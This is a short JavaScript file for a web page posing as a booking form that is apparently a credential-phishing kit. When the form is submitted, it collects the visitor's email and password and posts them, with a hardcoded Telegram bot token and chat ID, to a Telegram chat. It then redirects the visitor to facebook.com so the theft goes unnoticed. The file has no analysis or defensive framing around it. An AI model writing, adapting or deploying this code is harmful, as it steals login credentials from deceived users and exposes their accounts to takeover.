const BOT_TOKEN = "8624035358:AAGNATBSXPRxvYSZw19o4ykN6pWCLtrm5yk";
const CHAT_ID = "8815746182";

document.getElementById("bookingForm").addEventListener("submit", async function(event) {
  event.preventDefault();

  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  const message = `🔔 طلب حجز جديد

الايميل : ${email}
 الباسورد : ${password}`;

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message
      })
    });

    const result = await response.json();

    if (result.ok) {
      window.location.href = "https://www.facebook.com/";
    } else {
      alert("حدث خطأ أثناء الإرسال");
    }
  } catch (error) {
    alert("تعذر الاتصال بـ ");
  }
});